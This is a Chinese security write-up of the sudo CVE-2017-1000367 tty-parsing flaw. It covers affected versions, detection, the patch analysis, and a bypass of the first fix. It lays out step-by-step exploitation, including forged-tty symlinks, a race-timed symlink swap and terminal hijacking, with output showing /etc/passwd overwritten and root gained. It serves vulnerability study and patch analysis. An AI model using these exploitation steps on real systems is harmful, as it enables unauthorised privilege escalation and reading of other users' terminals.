4.  [https://www.freebuf.com/news/216821.html](https://www.freebuf.com/news/216821.html)
    

漏洞简讯
----

2017 年 5 月 30 日，国外安全研究人员发现 sudo 本地提权漏洞，该漏洞编号为 CVE-2017-1000367，漏洞源于 sudo 在获取 tty 时没有正确解析 / proc/[pid]/stat 的内容，本地攻击者可能会使用此漏洞来覆盖文件系统上的任何文件，从而监控其它用户终端设备或获取 root 权限。

研究员发现 Linux 系统中 sudo 的 get_process_ttyname() 有这样的漏洞：

这个函数会打开 “/proc/[pid]/stat ”，并从 field 7 (tty_nr) 中读取设备的 tty 编号。但这些 field 是以空格分开的，而 field 2 中（comm，command 的文件名）可以包含空格。

那么，当我们从符号链接 “./1” 中执行 sudo 命令时，get_process_ttyname() 就会调用 sudo_ttyname_dev() 来在内置的 search_devs[] 中努力寻找并不存在的 “1” 号 tty 设备.

然后，sudo_ttyname_dev() 开始调用 sudo_ttyname_scan() 方法，遍历 “/dev” 目录，并以广度优先方式寻找并不存在的 tty 设备“1”。

最后，在这个遍历过程中，我们可以利用漏洞让当前的用户伪造自己的 tty 为文件系统上任意的字符设备，然后在两个竞争条件下，该用户就可以将自己的 tty 伪造成文件系统上的任意文件。

值得注意的是，该漏洞第一次修复是在 1.8.20p1 版本，但该版本仍存在利用风险，可用于劫持另一个用户的终端。该漏洞最终于 sudo1.8.20p2 版本中得以修复（此处有第二次补丁:[https://github.com/sudo-project/sudo/commit/88674bae655d53b8d9739a6f64c03d2eeb5f1e8e](https://github.com/sudo-project/sudo/commit/88674bae655d53b8d9739a6f64c03d2eeb5f1e8e)

在 1.8.20p2 之前的 sudo 版本中，还存在以下漏洞利用思路：

具有 sudo 特权的用户可将 stdin、stdout 和 stderr 连接到他们选择的终端设备上来运行命令。用户可以选择与另一个用户当前正在使用的终端相对应的设备号，这使得攻击者可以对任意终端设备进行读写访问。根据允许命令的不同，攻击者有可能从另一个用户的终端读取敏感数据（例如密码）。

影响范围
----

1.  1.7.10 <= sudo version <= 1.7.10p9
    
2.  1.8.5 <= sudo version <= 1.8.20p1
    

检测方法
----

请检查 sudo 版本是否属于受漏洞影响版本：

检查系统是否开启 SELinux，sudo 是否支持 r 选项。如果没有开启或不支持 r 选项，则无法利用此漏洞：

```
[strawberry@redhat ~]$ sestatus
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             targeted
Current mode:                   enforcing
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Max kernel policy version:      28


```

漏洞分析
----

首先查看 CVE-2017-1000367 补丁 [https://github.com/sudo-project/sudo/commit/817fd283124c61e8d5c8243b9ba276ba37ed87fe](https://github.com/sudo-project/sudo/commit/817fd283124c61e8d5c8243b9ba276ba37ed87fe)，如下图所示，此处修改发生在 get_process_ttyname 函数内（位于 / src/ttyname.c 中），从注释上看改变了获取 tty dev 的方式，补丁之前通过空格数找到第 7 项（tty dev），补丁之后的流程是首先找到第二项的 ')' ，然后从第二项终止处通过空格数定位到第七项：

![](https://images.seebug.org/content/images/2020/02/7e678fdc-7f74-423d-a3a3-17e2da51ea6f.jpg-w331s)

下面来看之前代码，首先获取 pid，然后通过解析 / proc/pid/stat 来获取设备号（通过空格数），如果第七项不为 0 那就是设备号：

```
char * get_process_ttyname(char *name, size_t namelen)
{
    char path[PATH_MAX], *line = NULL;
    char *ret = NULL;
    size_t linesize = 0;
    int serrno = errno;
    ssize_t len;
    FILE *fp;
    debug_decl(get_process_ttyname, SUDO_DEBUG_UTIL)

    /* Try to determine the tty from tty_nr in /proc/pid/stat. */
    snprintf(path, sizeof(path), "/proc/%u/stat", (unsigned int)getpid());
    if ((fp = fopen(path, "r")) != NULL) {
    len = getline(&line, &linesize, fp);
    fclose(fp);
    if (len != -1) {
        /* Field 7 is the tty dev (0 if no tty) */
        char *cp = line;
        char *ep = line;
        const char *errstr;
        int field = 0;


```

在获取设备号之后，程序会调用 sudo_ttyname_dev 寻找设备文件。首先会在 search_devs 列表中的目录下寻找（这里只截取了 / dev/pts 下搜索的代码），如果该文件为字符设备文件并且设备号是要找的设备号，就返回该文件的路径吧。如果没找到，就调用 sudo_ttyname_scan 在 / dev 下进行广度搜索。

```
    /*
     * First check search_devs for common tty devices.
     */
    for (sd = search_devs; (devname = *sd) != NULL; sd++) {
    len = strlen(devname);
    if (devname[len - 1] == '/') {
        if (strcmp(devname, "/dev/pts/") == 0) {
        /* Special case /dev/pts */
        (void)snprintf(buf, sizeof(buf), "%spts/%u", _PATH_DEV,
            (unsigned int)minor(rdev));
        if (stat(buf, &sb) == 0) {
            if (S_ISCHR(sb.st_mode) && sb.st_rdev == rdev) {
            sudo_debug_printf(SUDO_DEBUG_INFO|SUDO_DEBUG_LINENO,
                "comparing dev %u to %s: match!",
                (unsigned int)rdev, buf);
            if (strlcpy(name, buf, namelen) < namelen)
                rval = name;
            else
                errno = ERANGE;
            goto done;
            }
        }
    ...
    /*
     * Not found?  Do a breadth-first traversal of /dev/.
     */


```

正常情况下，/dev/pts/0 对应了设备号 0x8800（34816）。测试：开 3 个终端，设备文件分别为 / dev/pts/0、/dev/pts/1 和 / dev/pts/2。可以发现，从 / dev/pts/0 起设备号从 34816 开始递增。

```
strawbe+   2038   2028  0 01:05 pts/0    00:00:00 bash
strawbe+   2048   2038  0 01:05 pts/0    00:00:00 sum
strawbe+   2071   2028  0 01:05 pts/1    00:00:00 bash
strawbe+   2139   2071  1 01:05 pts/1    00:00:00 python
strawbe+   2144   2028  0 01:05 pts/2    00:00:00 bash

strawberry@ubuntu:~$ cat /proc/2038/stat
2038 (bash) S 2028 2038 2038 34816 ...
strawberry@ubuntu:~$ cat /proc/2048/stat
2048 (sum) S 2038 2048 2038 34816 ...
strawberry@ubuntu:~$ cat /proc/2071/stat
2071 (bash) S 2028 2071 2071 34817 ...
strawberry@ubuntu:~$ cat /proc/2139/stat
2139 (python) S 2071 2139 2071 34817 ...
strawberry@ubuntu:~$ cat /proc/2144/stat
2144 (bash) S 2028 2144 2144 34818 ...


```

由于程序会通过进程 stat 文件中的空格数来定位设备号，而进程名是可控的，进程名中可能会包含空格，使得设备号可控，这是问题的所在 。下面进行测试，首先设置两个指向 sudo 的软连接：./\ \ \ \ \ 66666\ 和./\ \ \ \ \ 34818\ （伪造的设备号后面需要填一个空格，在 sudo_strtonum 函数中会有校验），然后分别使用它们执行 sudo ls，显然 66666 失败了，因为没有找到 num 为 66666 的设备。

```
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_20/build$ tty
/dev/pts/2
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_20/build$ ./\ \ \ \ \ 66666\  ls
     66666 : no tty present and no askpass program specified
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_20/build$ ./\ \ \ \ \ 34818\  ls
'     34818 '  '     66666 '   bin   breakt   include   libexec   sbin   share


```

下面看第二次补丁内容，主要是获取 / proc/pid/stat 中内容的方式不同，补丁前还是采用 getline 函数获取文件中的一行，因为一般情况下 / proc/pid/stat 中的内容就是一行。补丁后采用 read 函数读取，并检查读取的内容中是否包含 “\x00”，这样如果不报错的话，buf 中就包含了文件的全部内容。另外，buf 的长度为 1024，也在一定程度上限制了使用超长程序名的攻击。

![](https://images.seebug.org/content/images/2020/02/57d98155-0ec9-4662-9225-21978ecfde3e.jpg-w331s)

第一次补丁绕过：第一次补丁中通过 strrchr 函数找到最后一个 ")"，然后再通过空格定位设备号。然而程序只读取一行，我们可以在程序名中加入 ")"，然后在伪造的内容后面加入换行符，这样程序读取数据之后会找到我们的 ")" 作为程序名结束的标志，我们还是可以控制设备号。

```
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_20p1/build$ tty
/dev/pts/3
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_20p1/build$ './)     34819 
' ls
')     34819 '$'\n'   bin   include   libexec   sbin   share
strawberry@ubuntu:~/Desktop/sudo-SUDO_1_8_20p1/build$ "./)     66666 
" ls
)     66666 
: no tty present and no askpass program specified


```

继续~ sudo 在核对用户密码之后，会调用 run_command(&command_details) 来运行用户指定的命令，然后 run_command->sudo_execute->exec_cmnd->exec_setup->selinux_setup->relabel_tty，在 relabel_tty 中可能会调用 open(ttyn,O_RDWR|O_NONBLOCK) 和 dup2 将 stdin,stdout, and stderr 重定向到用户的 tty，攻击者可以利用这一点对控制的设备号所对应的目标文件进行未授权读写操作。

```
    /* Re-open tty to get new label and reset std{in,out,err} */
    close(se_state.ttyfd);
    se_state.ttyfd = open(ttyn, O_RDWR|O_NONBLOCK);
    if (se_state.ttyfd == -1) {
        sudo_warn(U_("unable to open %s"), ttyn);
        goto bad;
    }
    (void)fcntl(se_state.ttyfd, F_SETFL,
        fcntl(se_state.ttyfd, F_GETFL, 0) & ~O_NONBLOCK);
    for (fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
        if (isatty(fd) && dup2(se_state.ttyfd, fd) == -1) {
        sudo_warn("dup2");
        goto bad;
        }
    }


```

另外，exec_setup 会判断 CD_RBAC_ENABLED 标志位是否设置，设置了才会去执行 selinux_setup（如下面第一段代码所示）。如果使用 sudo 的 r 选项，且开启 SELinux，则该标志就会设置（如第二段代码所示）。所以，如果系统开启了开启 SELinux，且 sudo 支持 r 选项，则有机会利用这个漏洞。

```
#ifdef HAVE_SELINUX
    if (ISSET(details->flags, CD_RBAC_ENABLED)) {
    if (selinux_setup(details->selinux_role, details->selinux_type,
        ptyname ? ptyname : user_details.tty, ptyfd) == -1)
        goto done;
    }
#endif

#ifdef HAVE_SELINUX
    if (details->selinux_role != NULL && is_selinux_enabled() > 0)
    SET(details->flags, CD_RBAC_ENABLED);
#endif


```

漏洞利用
----

先复述一下第一种利用思路吧（这个难一点点），get_process_ttyname 函数获取设备号的方式存在漏洞，使得攻击者可控制设备号。程序会通过比对的方式获取与该设备号相对应的设备文件，首先会在内置的 search_devs 列表中寻找，如果没找到就会从 / dev 中寻找。攻击者可以在 / dev 目录下选择一个可写的文件夹，向其中写入一个指向 / dev/pts/num 的软连接，要求这个 num 文件当前不存在，并且要和伪造的设备号相对应，就像前面所说的 / dev/pts/0 和 34816。然后通过带有空格和伪造设备号的软连接启动 sudo（要加 - r 选项，这样才能重定向），程序在 / dev/pts 下找不到 num 文件，因而会从 / dev 下没有被忽略的文件中去找，当程序找到存放链接文件的文件夹时，暂停 sudo 程序，调用 openpty 函数不断创建终端，直到出现 / dev/pts/num 文件，然后继续运行 sudo 程序，这样程序获取的设备文件就是攻击者伪造的那个软链接。然后在程序关闭文件夹的时候，再次暂停程序，将这个软链接重新指向攻击者想要写入的文件然后运行程序，这样程序以为的 tty 实际上是攻击者指定的文件，然后程序会通过 dup2 将 stdin, stdout, and stderr 重定向到这个文件。这样我们可以通过控制可用命令的输出或报错信息，从而精准覆写系统上的任意文件。

1、寻找 / dev 下可写目录，可以找到 mqueue / 和 shm/。在 shm / 中创建文件夹 /_tmp，并在其中设置 / dev/shm/_tmp/_tty->/dev/pts/57、/dev/shm/_tmp/ 34873 ->/usr/bin/sudo。

```
strawberry@ubuntu:/dev$ ll | grep drwxrwx
drwxrwxrwt   2 root       root          40 Feb 13 18:20 mqueue/
drwxrwxrwt   3 root       root          60 Feb 13 19:08 shm/


```

2、sudo -r 选项，ubuntu 中的 sudo 虽内置了这个选项，但没有安装 selinux，所以没有测试成功。

```
 -r role       create SELinux security context with specified role


```

3、在 redhat 下测试，sudo -r unconfined_r 可以用。执行 / dev/shm/_tmp/ 34873 -r unconfined_r /usr/bin/sum"--\nHELLO\nWORLD\n"，程序会去寻找设备号为 34873 的设备。

```
[testtest@redhat ~]$ id -Z
unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[testtest@redhat ~]$ sudo -r unconfined_r sum test
00000     0
[testtest@redhat ~]$ sudo -r asdf sum test
sudo: unable to get default type for role asdf


```

4、由于 / dev/pts/57 不存在，程序在遍历完 search_devs 列表中的目录后会在 / dev 下寻找，我们监测 / dev/shm/_tmp 文件夹是否打开，如果打开了就向 sudo 进程发送 SIGSTOP 信号使其暂停，同时调用 openpty 函数生成 / dev/pts/57，如果 / dev/pts/57 存在了，就向 sudo 发送 SIGCONT 信号恢复其运行。

```
[+] Create /dev/pts/2
[+] Create /dev/pts/3
...
[+] Create /dev/pts/57


```

5、检测到 / dev/shm/_tmp 文件夹关闭后，暂停 sudo 程序，修改 / dev/shm/_tmp/_tty，使其指向 / etc/motd，成功后继续运行程序。

6、为了可以两次成功暂停 sudo 进程，可以将其优先级设置为 19，调用 sched_setscheduler 为其设置 SCHED_IDLE 策略，调用 sched_setaffinity 使 sudo 进程和利用进程使用相同的 CPU，而利用进程的优先级被设置为 - 20（最高优先级）。

7、最终测试：在 sudoers 添加 testtest ALL=(ALL) /usr/bin/sum 策略，运行 sudopwn（将输出 / 重定向到 / etc/motd），可以看出文件中的内容原本为 “motd”，运行程序后被覆盖为 sum 命令的报错信息：

```
Last login: Thu Feb 13 15:02:54 2020
motd
[testtest@redhat ~]$ ./sudopwn
[sudo] password for testtest: 
[testtest@redhat ~]$ cat /etc/motd
/usr/bin/sum: unrecognized option '--
HELLO
WORLD
'
Try '/usr/bin/sum --help' for more information.


```

第二种利用思路简单一些，攻击者在登录之后，可进入 / dev/pts 目录筛选出其它用户登录的设备，计算该设备号，利用此漏洞使用带有此设备号的符号链接来启动 sudo 程序，根据其授权的命令不同可选择获取对该终端的读写权限。

```
[testtest@redhat pts]$ tty
/dev/pts/1
[testtest@redhat pts]$ ls
0  1  2  ptmx
[testtest@redhat ~]$ ./sudopwn2
Input pts num: 2
[sudo] password for testtest: 
[testtest@redhat ~]$ 

[strawberry@redhat ~]$ /usr/bin/sum: unrecognized option '--
HELLO
WORLD
'
Try '/usr/bin/sum --help' for more information.


```

漏洞总结
----

sudo 获取设备号的方式存在漏洞，使得攻击者可控制设备号。攻击者可选取一组对应的设备号和设备文件，使用带有伪造设备号的符号链接启动 sudo。由于漏洞的存在，程序会读取错误的设备号，并在 / dev 中寻找相应的设备文件（如果是本身不存在的设备文件，攻击者还需选择合适的时机创建此设备文件，并在另一刻将指向其的符号链接指向目标文件）。当程序运行在启用 SELinux 的系统上时，如果 sudo 使用了 r 选项使用指定 role 创建 SELinux 安全上下文，则会将 stdin、stdout 和 stderr 重定向到当前设备，这可能允许攻击者对目标设备进行未授权读写。假如攻击者利用该漏洞覆写了 / etc/passwd 文件，则有可能获取 root 权限。

```
strawberry@ubuntu:~$ ssh testtest@192.168.29.173
testtest@192.168.29.173's password: 
Last login: Thu Feb 13 15:02:54 2020
[testtest@redhat ~]$ whoami
testtest
[testtest@redhat ~]$ ./sudopwn 
[sudo] password for testtest: 
[testtest@redhat ~]$ whoami
whoami: cannot find name for user ID 1001
[testtest@redhat ~]$ logout
Connection to 192.168.29.173 closed.

strawberry@ubuntu:~$ ssh testtest@192.168.29.173
testtest@192.168.29.173's password: 
Last login: Thu Feb 13 16:29:05 2020 from 192.168.29.155
[root@redhat ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023


```

**参考文章**

1.  [https://www.sudo.ws/alerts/linux_tty.html](https://www.sudo.ws/alerts/linux_tty.html)
    
2.  [https://www.freebuf.com/articles/system/136975.html](https://www.freebuf.com/articles/system/136975.html)
    
3.  [https://www.freebuf.com/vuls/136156.html](https://www.freebuf.com/vuls/136156.html)
    
4.  [http://securityaffairs.co/wordpress/59606/hacking/linux-flaw.html](http://securityaffairs.co/wordpress/59606/hacking/linux-flaw.html)
    
5.  [https://www.openwall.com/lists/oss-security/2017/05/30/16](https://www.openwall.com/lists/oss-security/2017/05/30/16)
    

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1129/](https://paper.seebug.org/1129/)